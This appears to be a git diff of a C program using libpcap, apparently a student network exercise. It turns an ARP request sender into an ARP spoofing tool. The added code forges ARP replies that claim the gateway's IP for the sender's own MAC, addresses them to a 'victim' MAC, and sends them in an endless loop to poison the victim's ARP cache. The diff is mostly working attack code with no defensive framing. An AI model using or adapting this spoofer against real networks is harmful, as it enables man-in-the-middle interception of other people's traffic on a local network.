@@ -35,24 +35,24 @@ int s_getIpAddress (const char * ifr, unsigned char * out);
 char *getMAC(const char *ip, struct sniff_arp * arp_packet);
 
 void show_data (const u_char * packet) {
-	int i, tmp=0;
+        int i, tmp=0;
 
-	printf("Data Code : \n ");
-	for (i=0; i<46; i++) {
-		printf("%.2x ", *(packet+i)&0xff);
-		tmp++;
+        printf("Data Code : \n ");
+        for (i=0; i<46; i++) {
+                printf("%.2x ", *(packet+i)&0xff);
+                tmp++;
 
-		if (tmp%16 == 0)
-			printf("\n");
-		if (tmp%8 == 0)
-			printf(" ");
-	}
+                if (tmp%16 == 0)
+                        printf("\n");
+                if (tmp%8 == 0)
+                        printf(" ");
+        }
 
-	printf("\n");
+        printf("\n");
 
 }
 
-void create_arp (struct sniff_arp * arp_packet, char *dev, u_char *vip, u_char *dip) {
+void create_arp (struct sniff_arp * arp_packet, char *dev, u_char *vip, u_char *dip, u_char *vmac, int check) {
         char *sip = (char*)calloc(sizeof(char), 4);
         u_char addr[4] = {0};
         int i;
@@ -61,21 +61,32 @@ void create_arp (struct sniff_arp * arp_packet, char *dev, u_char *vip, u_char *
                 sprintf(sip, "%d.%d.%d.%d", (int)addr[0], (int)addr[1], (int)addr[2], (int)addr[3]);  
         }
 
-        for (i=0; i<6; i++)
-                arp_packet->arp_dmhost[i] = 0xff;
-
         getMAC(sip, arp_packet);
 
         arp_packet->ether_type = htons(0x0806);
         arp_packet->arp_htype = htons(0x0001);
         arp_packet->arp_p = htons(0x0800);
-        arp_packet->arp_opcode= htons(0x0001);
 
         arp_packet->arp_hsize = 0x6;
         arp_packet->arp_psize = 0x4;
 
-        inet_pton(AF_INET, sip, &(arp_packet->arp_sip));
-        inet_pton(AF_INET, vip, &(arp_packet->arp_dip));
+        if (check == 1) {
+                arp_packet->arp_opcode= htons(0x0001);
+                inet_pton(AF_INET, sip, &(arp_packet->arp_sip));
+                inet_pton(AF_INET, vip, &(arp_packet->arp_dip));
+
+                for (i=0; i<6; i++)
+                        arp_packet->arp_dmhost[i] = 0x00;
+        } else if (check == 2) {
+                arp_packet->arp_opcode= htons(0x0002);
+                inet_pton(AF_INET, dip, &(arp_packet->arp_sip));
+                inet_pton(AF_INET, vip, &(arp_packet->arp_dip));
+
+                for (i=0; i<6; i++) {
+                        arp_packet->arp_dmhost[i] = vmac[i];
+                        arp_packet->ether_dhost[i] = vmac[i];
+                }
+        }                
 }
 
 int check_reply (const u_char *common_packet, u_char *vip, u_char *dip, u_char *vmac) {
@@ -109,7 +120,7 @@ int main(int argc, char **argv) {
 
         u_char packet[256];
         const u_char *common_packet;
-        u_char vmac[6];
+        u_char vmac[6] = {0};
         int i;
 
         if (argc == 4) {
@@ -130,13 +141,13 @@ int main(int argc, char **argv) {
                 mask = 0;
         }
 
-	handle = pcap_open_live (dev, SNAP_LEN, 1, 1000, errbuf);
-	if (handle == NULL) {
-		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
-		exit(EXIT_FAILURE);
-	}
+        handle = pcap_open_live (dev, SNAP_LEN, 1, 1000, errbuf);
+        if (handle == NULL) {
+                fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+                exit(EXIT_FAILURE);
+        }
 
-        create_arp(arp_packet, dev, vip, dip);
+        create_arp(arp_packet, dev, vip, dip, vmac, 1);
 
         memcpy(packet, arp_packet, 46);
         for (i=0; i<4; i++)
@@ -160,6 +171,22 @@ int main(int argc, char **argv) {
 
         printf("victim_MAC : %02x:%02x:%02x:%02x:%02x:%02x\n", vmac[0], vmac[1], vmac[2], vmac[3], vmac[4], vmac[5]);
 
+        create_arp(arp_packet, dev, vip, dip, vmac, 2);
+        memcpy(packet, arp_packet, 46);
+
+        for (i=0; i<4; i++)
+                packet[38+i] = packet[40+i];
+
+        show_data(packet);
+
+        while (1) {
+                if (pcap_sendpacket(handle, packet, 42 /* size */) != 0) {
+                        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
+                        return;
+                }
+        }
+
+        return 0;
 
 }
 
